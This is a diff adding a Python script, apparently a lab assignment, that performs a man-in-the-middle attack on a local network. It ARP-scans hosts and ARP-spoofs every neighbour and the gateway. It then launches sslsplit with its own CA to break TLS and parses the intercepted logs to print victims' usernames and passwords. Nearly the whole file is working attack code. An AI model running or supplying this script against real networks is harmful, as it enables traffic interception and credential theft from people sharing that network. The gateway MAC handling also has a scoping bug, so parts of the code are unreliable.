@@ -1,0 +1,145 @@
+#!/usr/bin/env python3
+from scapy.all import Ether, ARP, srp, send
+from subprocess import Popen, DEVNULL
+from sys import exit
+import netifaces as ni
+import time
+import os
+import threading
+
+# default IPv4 gateway: ('192.168.64.1', 'enp0s6')
+gateway = ni.gateways()['default'][ni.AF_INET]
+
+# initialize parameters
+AP_ip, AP_mac = gateway[0], None
+interface = gateway[1]
+possible_victims = {}
+fetch = True
+
+# calculate CIDR (Classless Inter-Domain Routing)
+netmask = ni.ifaddresses(interface)[ni.AF_INET][0]['netmask'] # 255.255.255.0
+length = sum(bin(int(i)).count('1') for i in netmask.split('.')) # 24
+cidr = AP_ip + '/' + str(length) # 192.168.64.1/24
+
+def list_devices():
+    """
+    Conducting ARP ping with the Scapy library to discover hosts on a local ethernet network 
+    and list out the IP and mac addresses of neighbor devices (except AP and attacker).
+    """
+    # ARP ping to discover hosts on a local ethernet network
+    results = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=cidr), timeout=3, verbose=0)[0]
+
+    # parse the response to get IP and MAC addresses
+    for sent, recv in results:
+        if recv.psrc != AP_ip:
+            possible_victims[recv.psrc] = recv.hwsrc # ip : mac
+        else: 
+            AP_mac = recv.hwsrc
+
+    # print the results
+    print("Available devices")
+    print('-------------------------------------')
+    print('IP Address          MAC Address      ')
+    print('-------------------------------------')
+    for ip, mac in possible_victims.items(): 
+        print('{:20}{}'.format(ip, mac))
+    print('-------------------------------------')
+
+
+def arp_spoofing():
+    """
+    Sending spoofed ARP packets to all neighbors (possible victims) to trick AP we are the victim 
+    and trick the victim we are AP via exchanging MAC addresses with the Scapy library.
+    """
+    for ip, mac in possible_victims.items():
+        # replace the victim's MAC address in AP's arp cache with the attacker's
+        arp_to_AP = ARP(hwdst=AP_mac, pdst=AP_ip, psrc=ip, op='is-at')
+        send(arp_to_AP, verbose=False)
+        # replace AP's MAC address in the victim's arp cache with the attacker's
+        arp_to_victim = ARP(hwdst=mac, pdst=ip, psrc=AP_ip, op='is-at')
+        send(arp_to_victim, verbose=False)
+
+    time.sleep(2)
+
+def ssl_split():
+    """
+    Utilizing Popen to create a subprocess and perform SSL Split on Encrypted SSL/TLS Connections 
+    with the `sslsplit` command (dumping out log connection content in sslsplit_log)
+    which enables further data fetching (see fetch_user_info()).
+    """
+    # sslsplit -D -l connect.log -S sslsplit_log -k key.pem -c ca.crt ssl 0.0.0.0 8443
+    Popen(['sslsplit', '-D', '-l', 'connect.log', '-S', 'sslsplit_log', '-k', 'key.pem', 
+            '-c', 'ca.crt', 'ssl', '0.0.0.0', '8443'], stdout=DEVNULL, stderr=DEVNULL)
+
+def fetch_user_info():
+    """
+    Iterating through all the log files in sslsplit_log as well as parsing the file content (with split()) to fetch 
+    username and password. In order not to fetch duplicate user information, the file contents would be erased 
+    after fetching the old contents since log contents from the same connection would be appended to the same log file.
+    """
+    DIR = 'sslsplit_log'
+    while fetch:
+        # iterate over files in the directory
+        for filename in os.listdir(DIR):
+            path = os.path.join(DIR, filename)
+            clear = False
+            # check log file
+            file = open(path, 'rb')
+            for line in file.readlines():
+                # search info
+                if b'username=' in line:
+                    # fetch username and password
+                    info = line.split(b'&')
+                    username = info[1].split(b'=')[1].decode()
+                    print('Username: ', username)
+                    password = info[2].split(b'=')[1].decode()
+                    print('Password: ', password)
+                    # set clear flag
+                    clear = True
+                    break
+            file.close()
+
+            # clear file content after finding username and password
+            if clear:
+                blank = open(path, 'w')
+                blank.close()
+                break
+        time.sleep(1)
+
+def restore_arp():
+    """
+    Restoring AP's MAC address on all neighbors' ARP table via sending ARP packets.
+    """
+    print("\n[!] CTRL+C detected ! Restoring the network ...")
+    for ip, mac in possible_victims.items():
+        # telling the victim AP's original mac address
+        arp_to_victim = ARP(hwdst=mac, hwsrc=AP_mac, pdst=ip, psrc=AP_ip, op='is-at')
+        send(arp_to_victim, verbose=False, count=7)
+
+if __name__ == "__main__":
+
+    # check user permission
+    if os.geteuid(): 
+        exit('Usage: sudo ./mitm_attack')
+
+    # task 1
+    list_devices()
+    # task 2
+    arp_spoofing()
+
+    # task 3
+    ssl_split()
+    # create thread to fetch user info
+    fetch_thread = threading.Thread(target=fetch_user_info)
+    fetch_thread.start()
+
+    try:
+        while True:
+            arp_spoofing()
+    except KeyboardInterrupt:
+        restore_arp()
+        fetch = False
+        fetch_thread.join()
+        print('Fetch thread killed.')
+
+
